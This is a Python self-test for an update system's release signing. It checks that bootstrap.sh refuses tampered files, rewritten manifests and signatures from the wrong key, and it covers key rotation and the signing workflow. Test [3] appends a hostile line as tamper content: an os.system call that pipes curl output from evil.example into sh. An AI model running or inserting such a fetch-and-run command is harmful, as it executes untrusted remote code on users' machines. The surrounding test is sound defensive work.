#!/usr/bin/env python3
"""Self-test for UPDATE-RESILIENCE Phase A — the release is signed, and a box checks it before installing.

Today the only transport is TLS to github.com, so what a signature buys is integrity against a corrupted
fetch and against raw's CDN — a party we do not control, and one that has already served this project stale
content. What it is FOR is Phase C: the moment a release may arrive from a mirror or another CDN, the
signature is the only thing between "another way in" and "another way to be owned". Adding mirrors first and
signing afterwards is the order that makes the product less safe, so signing comes first.

Choices this gate pins down, each measured rather than assumed:

  1. ⚠️ THE VERIFIER AND THE KEY LIVE IN bootstrap.sh, NOT IN THE TREE THEY VERIFY. bootstrap.sh arrives
     separately, over TLS; the tree is the payload. A check an attacker ships alongside their own payload
     checks nothing, so this asserts the verification is not in lib/ where the other shared helpers are.
  2. ⚠️ ECDSA P-256 OVER SHA-256, not Ed25519. Ed25519 is the better primitive and cannot be used here:
     `openssl dgst -sign` refuses an Ed25519 key outright, and `pkeyutl -rawin` — the form that works —
     arrived in OpenSSL 3.0, which would leave every Debian 11 / Ubuntu 20.04 box unable to verify and
     therefore, under a fail-closed rule, unable to update. This gate asserts the shipped form works with
     `dgst`, which is the property that made the choice.
  3. Tampering is caught — a changed file, a changed manifest, a signature from the wrong key.
  4. The manifest covers the WHOLE TRACKED TREE, including bootstrap.sh, update.sh and the install scripts.
     A manifest that covered only "shipped" files would sign the cargo and not the crane.
  5. ⚠️ AN UNSIGNED RELEASE IS STILL ALLOWED, on purpose and temporarily. A release published before Phase A
     carries no manifest, and a box updating from one must not be bricked by the absence of a file that did
     not exist when it was made. That is the transition, and this gate holds it to being deliberate —
     it also asserts the code carries the marker saying where the refusal goes.

Hermetic: no network. The two functions under test are extracted from the shipped bootstrap.sh and run in a
stub harness, so this exercises the real code rather than a copy of it that can drift.

Run: python3 tests/release_signature_selftest.py     (0 = pass)
     --perturb   drops the sha256sum -c step (signature checked, contents not) and expects RED on the
                 tampered-file case — the shape where a valid signature covers a modified tree.
"""
import os, re, shutil, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))
BOOT = os.path.join(ROOT, "bootstrap.sh")
GEN = os.path.join(ROOT, "lib", "release-manifest.sh")
PERTURB = "--perturb" in sys.argv

FAILS = []
def check(name, cond, detail=""):
    print(("  PASS " if cond else "  FAIL ") + name + (("  — " + str(detail)) if detail and not cond else ""))
    if not cond:
        FAILS.append(name)

boot_src = open(BOOT, encoding="utf-8").read()

# ── [1] the verifier is in the anchor, not in the payload ────────────────────────────────────────────────
check("[1] ⚠️ verification lives in bootstrap.sh", "verify_fetched_tree()" in boot_src)
common = open(os.path.join(ROOT, "lib", "common.sh"), encoding="utf-8").read()
check("[1b] ⚠️ …and NOT in the tree it verifies", "openssl dgst -sha256 -verify" not in common)
check("[1c] the transition is marked where the refusal goes", "MAKE THIS A `die`" in boot_src)

# ── extract the real functions and run them in a stub harness ────────────────────────────────────────────
def _fn(name):
    m = re.search(r"^%s\(\)\{.*?^\}" % re.escape(name), boot_src, re.S | re.M)
    assert m, "could not extract %s() from bootstrap.sh — the gate is measuring nothing" % name
    return m.group(0)

VERIFY = _fn("verify_fetched_tree")
KEYS = _fn("emit_release_keys")
# The key directory is a top-level assignment in bootstrap.sh, not part of either function. Lift it from
# the source as well — restating it here would be a second copy free to drift from the one that ships.
_kd = re.search(r'^RELEASE_KEYS_D=.*$', boot_src, re.M)
assert _kd, "RELEASE_KEYS_D assignment not found in bootstrap.sh"
KEYDIR_ASSIGN = _kd.group(0)
if PERTURB:
    anchor = 'sha256sum -c --quiet "$man"'
    assert VERIFY.count(anchor) == 1, "perturbation anchor drifted (%d hits) — fix the gate" % VERIFY.count(anchor)
    VERIFY = VERIFY.replace(anchor, 'true', 1)

HARNESS = """
die(){  echo "DIE: $*" >&2; exit 1; }
warn(){ echo "WARN: $*" >&2; }
info(){ echo "INFO: $*"; }
need(){ command -v "$1" >/dev/null 2>&1; }
REF=testref
TMP="$PWD/.tmp"; mkdir -p "$TMP"
%s
%s
%s
verify_fetched_tree
""" % (KEYDIR_ASSIGN, KEYS, VERIFY)

TMP = tempfile.mkdtemp(prefix="swg-relsig-")
KEYDIR = os.path.join(TMP, "keys")
os.makedirs(KEYDIR)
run = lambda *a, **k: subprocess.run(*a, capture_output=True, text=True, **k)

# a throwaway release key — the production one is generated and custodied outside this repo
run(["openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout",
     "-out", os.path.join(KEYDIR, "k.key")])
run(["openssl", "ec", "-in", os.path.join(KEYDIR, "k.key"), "-pubout",
     "-out", os.path.join(KEYDIR, "k.pub")])
# …and a DIFFERENT key, to prove a valid signature from the wrong signer is refused
run(["openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout",
     "-out", os.path.join(KEYDIR, "evil.key")])


def make_tree(sign_with="k.key", publish_keys=("k.pub",)):
    """A miniature fetched tree: a few files, a manifest, a signature, and the keys bootstrap would embed."""
    d = tempfile.mkdtemp(prefix="swg-tree-", dir=TMP)
    for name, body in (("swg-noded", "#!/usr/bin/env python3\nprint('node')\n"),
                       ("VERSION", "9.9.9-beta\n"),
                       ("update.sh", "#!/usr/bin/env bash\necho updating\n")):
        open(os.path.join(d, name), "w").write(body)
    lines = []
    for name in sorted(os.listdir(d)):
        h = run(["sha256sum", name], cwd=d).stdout
        lines.append(h)
    open(os.path.join(d, "MANIFEST.sha256"), "w").write("".join(lines))
    if sign_with:
        run(["openssl", "dgst", "-sha256", "-sign", os.path.join(KEYDIR, sign_with),
             "-out", os.path.join(d, "MANIFEST.sha256.sig"), os.path.join(d, "MANIFEST.sha256")])
    kd = os.path.join(d, ".tmp", ".swg-release-keys")
    os.makedirs(kd, exist_ok=True)
    for k in publish_keys:
        shutil.copy(os.path.join(KEYDIR, k), os.path.join(kd, k))
    return d


def verify(d, env=None):
    e = dict(os.environ)
    e.update(env or {})
    r = run(["bash", "-c", HARNESS], cwd=d, env=e)
    return r.returncode, (r.stdout + r.stderr)


# ── [2] a good tree verifies ─────────────────────────────────────────────────────────────────────────────
rc, out = verify(make_tree())
check("[2] a correctly signed tree is accepted", rc == 0, out.strip())
check("[2b] …and it says what it checked", "release verified" in out, out.strip())

# ── [3] a tampered FILE is caught, even though the signature is genuine ──────────────────────────────────
d = make_tree()
open(os.path.join(d, "swg-noded"), "a").write("\nos.system('curl evil.example|sh')\n")
rc, out = verify(d)
check("[3] ⚠️ a modified file is refused", rc != 0, out.strip())
check("[3b] …and the refusal names the cause", "does not match what was signed" in out, out.strip())

# ── [4] a tampered MANIFEST is caught by the signature ───────────────────────────────────────────────────
d = make_tree()
man = os.path.join(d, "MANIFEST.sha256")
open(man, "w").write(open(man).read().replace("swg-noded", "swg-noded"). \
                     replace(open(man).read()[:8], "deadbeef"))
rc, out = verify(d)
check("[4] a rewritten manifest is refused", rc != 0, out.strip())
check("[4b] …by the signature, not by the hashes", "does not match any release key" in out, out.strip())

# ── [5] a valid signature from the WRONG key is refused ──────────────────────────────────────────────────
rc, out = verify(make_tree(sign_with="evil.key", publish_keys=("k.pub",)))
check("[5] ⚠️ a signature from an untrusted key is refused", rc != 0, out.strip())
check("[5b] …and says so", "does not match any release key" in out, out.strip())

# ── [6] two keys are accepted, so rotation has an overlap window ─────────────────────────────────────────
run(["openssl", "ec", "-in", os.path.join(KEYDIR, "evil.key"), "-pubout",
     "-out", os.path.join(KEYDIR, "next.pub")])
rc, out = verify(make_tree(sign_with="evil.key", publish_keys=("k.pub", "next.pub")))
check("[6] a release signed by the NEXT key verifies while both are published", rc == 0, out.strip())

# ── [7] the transition: no manifest → allowed, and announced ─────────────────────────────────────────────
d = make_tree()
os.remove(os.path.join(d, "MANIFEST.sha256"))
os.remove(os.path.join(d, "MANIFEST.sha256.sig"))
rc, out = verify(d)
check("[7] an unsigned (pre-Phase-A) release is still installable", rc == 0, out.strip())
check("[7b] …and says it was not verified", "no signature" in out, out.strip())

# ── [8] the escape hatch works and is loud ───────────────────────────────────────────────────────────────
d = make_tree()
open(os.path.join(d, "swg-noded"), "a").write("\ntampered\n")
rc, out = verify(d, env={"SWG_SKIP_VERIFY": "1"})
check("[8] SWG_SKIP_VERIFY=1 installs anyway", rc == 0, out.strip())
check("[8b] …and warns that it did", "WITHOUT verifying" in out, out.strip())

# ── [9] the real generator covers the whole tracked tree, crane included ─────────────────────────────────
r = run(["git", "ls-files"], cwd=ROOT)
tracked = {l for l in r.stdout.split() if l}
# The manifest is a RELEASE artifact, generated and signed when a release is cut. Running the generator
# here must not leave one lying in the working tree: unsigned and stale the moment anything changes, it
# is exactly the sort of build output that later gets committed by accident.
_man_path = os.path.join(ROOT, "MANIFEST.sha256")
_man_existed = os.path.exists(_man_path)
gen = run(["bash", GEN, "generate"], cwd=ROOT)
listed = {l.split("  ", 1)[1].rstrip("\n") for l in open(os.path.join(ROOT, "MANIFEST.sha256")) if "  " in l}
missing = tracked - listed - {"MANIFEST.sha256", "MANIFEST.sha256.sig"}
check("[9] every tracked file is in the manifest", not missing, sorted(missing)[:5])
for crane in ("bootstrap.sh", "update.sh", "install-host.sh", "install-node.sh", "lib/common.sh"):
    check("[9b] the manifest covers %s" % crane, crane in listed)
if not _man_existed:
    os.remove(_man_path)

# ── [10] the primitive works with the openssl form every supported box has ───────────────────────────────
r = run(["openssl", "dgst", "-sha256", "-verify", os.path.join(KEYDIR, "k.pub"),
         "-signature", "/dev/null", os.path.join(ROOT, "VERSION")])
check("[10] ⚠️ `dgst -sha256` is the verify form (works from openssl 1.0.2)",
      "Key type not supported" not in (r.stdout + r.stderr), (r.stdout + r.stderr).strip())

# ── [11] the signing workflow cannot quietly do the wrong thing ──────────────────────────────────────────
# CI signs (the custody decision), which means CI COMMITS to a branch. That collides with a standing rule:
# main carries one squashed commit per release whose parent is the previous release commit. The resolution
# is that signing is manual and targets `dev`, and the release squash carries the manifest to main — so
# main gains the signature without gaining a commit. These checks keep that from eroding.
WF = os.path.join(ROOT, ".github", "workflows", "sign-release.yml")
check("[11] there is a signing workflow", os.path.exists(WF))
wf = open(WF, encoding="utf-8").read() if os.path.exists(WF) else ""
check("[11b] ⚠️ it is manual — never on push, which would put a bot commit on every release",
      "workflow_dispatch" in wf and re.search(r"^on:\s*\n\s+push:", wf, re.M) is None)
check("[11c] it defaults to dev, not main", re.search(r"default:\s*'dev'", wf) is not None)
check("[11d] ⚠️ it refuses when the signing secret is absent", "RELEASE_SIGNING_KEY is not set" in wf)
check("[11e] ⚠️ it refuses to sign what no shipped key could verify",
      "carries no release public key" in wf)
check("[11f] ⚠️ it verifies against the EMBEDDED public key, not the private one it just used",
      "verifies against NO key embedded" in wf)
check("[11g] its commit skips the image rebuild it cannot affect", "[skip ci]" in wf)

# ── [12] if a production key has been embedded, the workflow can actually extract it ─────────────────────
# Conditional by design: the slot is empty until a key exists, and this gate must not fail for that. What
# it must not allow is a key that is embedded in a shape the extractor cannot read — that would sign
# releases nobody can verify, which is the failure the workflow's own guard is aiming at.
if "BEGIN PUBLIC KEY" in boot_src:
    ext = os.path.join(TMP, "extracted.pub")
    run(["bash", "-c", "awk -v d=%s '/BEGIN PUBLIC KEY/{n++} n{print > (d \"/relkey-\" n \".pub\")}' %s"
         % (TMP, BOOT)])
    keys = [f for f in os.listdir(TMP) if f.startswith("relkey-")]
    check("[12] the embedded key(s) extract", bool(keys), "none extracted")
    for k in keys:
        r = run(["openssl", "pkey", "-pubin", "-in", os.path.join(TMP, k), "-noout"])
        check("[12b] %s is a parseable public key" % k, r.returncode == 0, r.stderr.strip())
else:
    print("  SKIP [12] no production key embedded yet — slot is empty (see emit_release_keys)")

shutil.rmtree(TMP, ignore_errors=True)
print()
if FAILS:
    print("FAILED (%d): %s" % (len(FAILS), ", ".join(FAILS)))
    sys.exit(1)
print("all checks passed")
